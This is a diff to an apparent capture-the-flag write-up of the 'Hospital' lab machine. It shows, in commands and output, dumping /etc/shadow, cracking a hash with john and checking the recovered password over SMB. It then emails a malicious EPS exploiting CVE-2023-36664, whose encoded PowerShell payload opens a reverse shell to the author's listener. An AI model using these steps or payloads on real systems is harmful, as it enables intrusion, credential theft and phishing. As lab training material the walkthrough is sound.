@@ -636,35 +636,129 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-
 ```bash
+# cat /etc/shadow | grep '\$'
+cat /etc/shadow | grep '\$'
+root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
+drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
 ```
 
 ```bash
+$ cat shadow.hashes 
+root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
+drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
 ```
 
 ```bash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow.hashes 
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+qwe123!@#        (drwilliams)     
+1g 0:00:00:19 DONE (2024-08-20 05:39) 0.05007g/s 10768p/s 10768c/s 10768C/s sexyss..pakimo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+## Main Target - 10.10.11.241
+
+```bash
+$ netexec smb $TARGET -u 'drwilliams' -p 'qwe123!@#' 
+SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.241    445    DC               [+] hospital.htb\drwilliams:qwe123!@#
 ```
 
 ```bash
+$ netexec smb $TARGET -u 'drwilliams' -p 'qwe123!@#' --shares
+SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.241    445    DC               [+] hospital.htb\drwilliams:qwe123!@# 
+SMB         10.10.11.241    445    DC               [*] Enumerated shares
+SMB         10.10.11.241    445    DC               Share           Permissions     Remark
+SMB         10.10.11.241    445    DC               -----           -----------     ------
+SMB         10.10.11.241    445    DC               ADMIN$                          Remote Admin
+SMB         10.10.11.241    445    DC               C$                              Default share
+SMB         10.10.11.241    445    DC               IPC$            READ            Remote IPC
+SMB         10.10.11.241    445    DC               NETLOGON        READ            Logon server share 
+SMB         10.10.11.241    445    DC               SYSVOL          READ            Logon server share
 ```
 
 ```bash
+$ netexec smb $TARGET -u 'drwilliams' -p 'qwe123!@#' --rid-brute
+SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.241    445    DC               [+] hospital.htb\drwilliams:qwe123!@# 
+SMB         10.10.11.241    445    DC               498: HOSPITAL\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.11.241    445    DC               500: HOSPITAL\Administrator (SidTypeUser)
+...
+SMB         10.10.11.241    445    DC               1601: HOSPITAL\drbrown (SidTypeUser)
+SMB         10.10.11.241    445    DC               1602: HOSPITAL\drwilliams (SidTypeUser)
+SMB         10.10.11.241    445    DC               3101: HOSPITAL\Loggers (SidTypeAlias)
 ```
 
-```bash
-```
+No access to WinRM.
 
 ```bash
+$ netexec winrm $TARGET -u 'drwilliams' -p 'qwe123!@#'         
+WINRM       10.10.11.241    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:hospital.htb)
+WINRM       10.10.11.241    5985   DC               [-] hospital.htb\drwilliams:qwe123!@#
 ```
 
-```bash
-```
+After more enumeration we find out that drwilliams' credential works on the webmail tool.
+
+![Webmail - Dr. Williams](images/hospital_webmail_drwilliams.png)
+
+![Webmail - Dr. Williams - inbox](images/hospital_webmail_drwilliams_inbox.png)
+
+
 
 ```bash
+Needle designs for Darius Simion.
+Contact photo
+From drbrown@hospital.htb on 2023-10-23 15:40
+Details Headers
+Dear Lucy,
+
+I wanted to remind you that the project for lighter, cheaper and
+environmentally friendly needles is still ongoing 💉. You are the one in
+charge of providing me with the designs for these so that I can take
+them to the 3D printing department and start producing them right away.
+Please make the design in an ".eps" file format so that it can be well
+visualized with GhostScript.
+
+Best regards,
+Chris Brown.
+😃
 ```
 
+It seems Dr. Chris Brown is waiting for a `.eps` file to run with Ghostscript.
+
+### [CVE-2023-36664 - Ghostscript - command injection](https://github.com/rafamarrara/CTFs/tree/main/Labs/CVE-2023-36664)
+
+Generate a payload.
+
+![Rev Shell](images/hospital_webmail_rev_shell.png)
+
+Create a malicious file using the following [PoC exploit](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection).
+
 ```bash
+$ python3 CVE_2023_36664_exploit.py --generate --filename file01 --extension eps --payload "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAiACwAOQAwADAAMgApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
+[+] Generated EPS payload file: file01.eps
+```
+
+Reply back on the email attaching the malicious `.eps` file.
+
+![Webmail reply](images/hospital_webmail_reply_eps.png)
+
+A minute later we get a shell on our listener.
+
+```bash
+$ rlwrap -cAr nc -nlvp 9002
+listening on [any] 9002 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.11.241] 27896
+
+PS C:\Users\drbrown.HOSPITAL\Documents> whoami
+hospital\drbrown
 ```
 
 ```bash
